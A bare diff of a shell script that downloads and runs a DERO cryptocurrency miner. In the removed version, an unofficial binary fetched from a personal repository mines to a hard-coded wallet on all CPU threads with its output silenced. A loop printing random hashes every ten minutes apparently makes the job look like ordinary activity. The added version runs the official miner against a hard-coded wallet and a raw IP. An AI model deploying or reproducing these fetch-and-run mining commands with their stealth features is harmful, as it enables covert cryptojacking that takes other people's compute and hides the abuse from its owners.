@@ -1,4 +1,4 @@
-wget https://raw.githubusercontent.com/novalanto010101/file/main/uranus-0.0.3.1-linux-amd64.tar.xz
-tar xf uranus-0.0.3.1-linux-amd64.tar.xz
-./uranus -o wss://dero-node-overlode.mysrv.cloud:10300 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xns0ddcycy3u9v -t $(nproc --all) >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+wget https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz
+tar xvzf dero_linux_amd64.tar.gz
+cd dero_linux_amd64
+./dero-miner-linux-amd64 --wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeecegwwntwqfyshs078y --mining-threads 4 --daemon-rpc-address 161.35.166.82:10100
